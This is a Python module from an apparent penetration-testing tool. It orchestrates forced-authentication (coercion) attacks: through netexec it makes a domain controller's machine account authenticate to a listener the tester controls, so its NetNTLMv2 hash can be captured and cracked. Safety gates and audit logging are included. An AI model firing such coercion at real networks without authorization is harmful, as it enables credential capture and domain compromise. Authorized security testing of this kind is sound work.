"""Coercion (forced authentication) - the gated orchestration (intrusive, opt-in).

Like `poison`/`spray`, this is *not* part of `scan` and never runs by default: it ACTIVELY
sends an RPC to a target (usually a DC) that coerces the target's machine account into
authenticating to a listener we control. It only TRIGGERS the auth; the coerced NetNTLMv2 is
captured by a separately-running `redness poison` (Responder) listener and flows through the
existing crack pipeline (docs/NETNTLM.md). This module recovers no credential; it emits the
per-vector `coercion-*` vulnerability findings.

Design mirrors poison.py / spray.py: the pure parser / argv / findings live in
engines/coerce.py; this module is the impure orchestration. The nxc boundary and the DC check
are single injectable callables (`nxc_run`, `dc_check`), so `run_coerce` unit-tests with no
nxc/DC.

Safety model (see docs/COERCION.md; agreed in review):
  * DC validation - coercion is refused unless the target looks like a Domain Controller
    (AD LDAP is DC-only), overridable with `--target-not-dc-ok` (findings then HIGH not CRITICAL).
  * Uncredentialed coercion is a safety refusal overridden only by BOTH --force AND a second,
    distinct typed FORCE confirmation (`confirm_force`) - like spray's --force double-gate.
  * Every attempt (per method, plus refusals) is appended to loot/coerce_audit.log for
    post-engagement de-confliction.
  * No rate limiting (no lockout/DoS risk on the target). No cleanup (stateless RPC) - but the
    target WILL log the authentication/RPC event.

Authorized, in-scope engagements only.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Optional

from .engines.coerce import build_findings, coerce_argv, parse_coerce_plus
from .events import Event, EventBus, EventKind
from .findings import Report


@dataclass
class CoerceOutcome:
    results: list = field(default_factory=list)     # list[CoerceResult]
    is_dc: bool = False
    refused: bool = False
    reason: str = ""                                # "uncredentialed" | "not-a-dc"


# --------------------------------------------------------------------------- #
# Impure seams - nxc invocation + DC check (both injectable)                   #
# --------------------------------------------------------------------------- #
def _default_nxc_run(argv: list[str], *, timeout: int = 300) -> str:
    exe = shutil.which("nxc") or shutil.which("netexec")
    if not exe:
        return ""
    try:
        proc = subprocess.run([exe] + argv, capture_output=True, text=True, timeout=timeout)
    except (subprocess.TimeoutExpired, OSError):
        return ""
    return (proc.stdout or "") + "\n" + (proc.stderr or "")


def _default_dc_check(target: str) -> bool:
    """LDAP-based DC validation: AD LDAP (389/636) is served only by Domain Controllers, so a
    host answering LDAP is (in an AD environment) a DC. Injectable for tests.

    Caveat: a non-AD LDAP server (e.g. OpenLDAP) would be a false positive - the operator uses
    --target-not-dc-ok to override the refusal in that case.
    """
    from .discovery import check_port
    return check_port(target, 389) or check_port(target, 636)


# --------------------------------------------------------------------------- #
# Audit trail (append-only, git-ignored loot/)                                 #
# --------------------------------------------------------------------------- #
def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _audit(loot_dir: str, target: str, listener: str, method: str, *,
           credentialed: bool, result: str) -> None:
    """Log one coercion attempt / refusal for post-engagement de-confliction.

    Two sinks: the detailed per-vector `coerce_audit.log` sidecar (human key=value lines) and
    the unified `audit.log` timeline shared with scan/poison/spray/offensive actions.
    """
    line = (f"{_ts()} target={target} listener={listener} method={method} "
            f"auth={'credentialed' if credentialed else 'uncredentialed'} result={result}")
    try:
        os.makedirs(loot_dir, exist_ok=True)
        with open(os.path.join(loot_dir, "coerce_audit.log"), "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError:
        pass
    from . import audit
    audit.record("coerce", loot_dir=loot_dir, target=target, listener=listener, method=method,
                 credentialed=credentialed, result=result)


# --------------------------------------------------------------------------- #
# Orchestration                                                                #
# --------------------------------------------------------------------------- #
def _emit(bus: Optional[EventBus], kind: EventKind, **data) -> None:
    if bus is not None:
        bus.publish(Event(kind=kind, data=data, engine="coerce"))


def run_coerce(
    target: str,
    listener: str,
    *,
    method: str = "all",
    username: Optional[str] = None,
    password: Optional[str] = None,
    nthash: Optional[str] = None,
    domain: Optional[str] = None,
    kerberos: bool = False,
    target_not_dc_ok: bool = False,
    force: bool = False,
    confirm_force: Optional[Callable[[str], bool]] = None,
    bus: Optional[EventBus] = None,
    engagement: str = "REDNESS coercion",
    loot_dir: str = "loot",
    nxc_run: Optional[Callable[[list[str]], str]] = None,
    dc_check: Optional[Callable[[str], bool]] = None,
) -> tuple[Report, CoerceOutcome]:
    """Validate + fire coercion against `target`, return an aggregated Report.

    Gates (both refuse before any RPC touches the target): an uncredentialed run needs BOTH
    `force` and `confirm_force("uncredentialed")` True; a target that does not look like a DC
    needs `target_not_dc_ok`. `nxc_run`/`dc_check` are the injectable boundaries for tests.
    Emits no credential (coerce recovers none); severity is CRITICAL on a DC, else HIGH.
    """
    nxc_run = nxc_run or _default_nxc_run
    dc_check = dc_check or _default_dc_check
    report = Report(engagement=engagement, target=f"coerce {target}")
    root = f"coerce:{target}"
    credentialed = bool(username and (password or nthash or kerberos))
    _emit(bus, EventKind.STATUS, message=f"coerce start on {target} -> listener {listener}")
    _emit(bus, EventKind.NODE, id=root, label=f"coerce {target}", type="host")

    def _allow(reason: str) -> bool:
        # override a safety refusal only with BOTH --force and a positive FORCE confirmation
        return force and confirm_force is not None and confirm_force(reason)

    # --- gate 1: uncredentialed coercion (needs --force + FORCE) --- #
    if not credentialed and not _allow("uncredentialed"):
        _emit(bus, EventKind.STATUS,
              message="refused: uncredentialed coercion - needs --force + FORCE")
        _audit(loot_dir, target, listener, method,
               credentialed=False, result="refused-uncredentialed")
        return report, CoerceOutcome(refused=True, reason="uncredentialed")

    # --- gate 2: DC validation (unless --target-not-dc-ok) --- #
    is_dc = dc_check(target)
    if not is_dc and not target_not_dc_ok:
        _emit(bus, EventKind.STATUS,
              message=f"refused: {target} does not look like a DC (no LDAP) - use --target-not-dc-ok")
        _audit(loot_dir, target, listener, method,
               credentialed=credentialed, result="refused-not-a-dc")
        return report, CoerceOutcome(is_dc=False, refused=True, reason="not-a-dc")

    # --- fire coercion --- #
    _emit(bus, EventKind.STATUS, message=f"coercing {target} via {method} (DC={is_dc})")
    argv = coerce_argv(target, listener, method=method, username=username, password=password,
                       domain=domain, nthash=nthash, kerberos=kerberos)
    results = parse_coerce_plus(nxc_run(argv))

    report.findings = build_findings(results, target=target, is_dc=is_dc, listener=listener,
                                     credentialed=credentialed)
    _emit(bus, EventKind.NODE, id=target, label=target, type="host")
    if not results:
        _audit(loot_dir, target, listener, method, credentialed=credentialed, result="no-output")
    for r in results:
        _audit(loot_dir, target, listener, r.method, credentialed=credentialed,
               result="coerced" if r.coerced else "not-vulnerable")
        if r.coerced:
            _emit(bus, EventKind.EDGE, src=root, dst=target, label=f"coerced ({r.method})")
    for f in report.findings:
        _emit(bus, EventKind.FINDING, finding=f.to_dict())
    _emit(bus, EventKind.DONE, engine="coerce")
    return report, CoerceOutcome(results=results, is_dc=is_dc, refused=False)
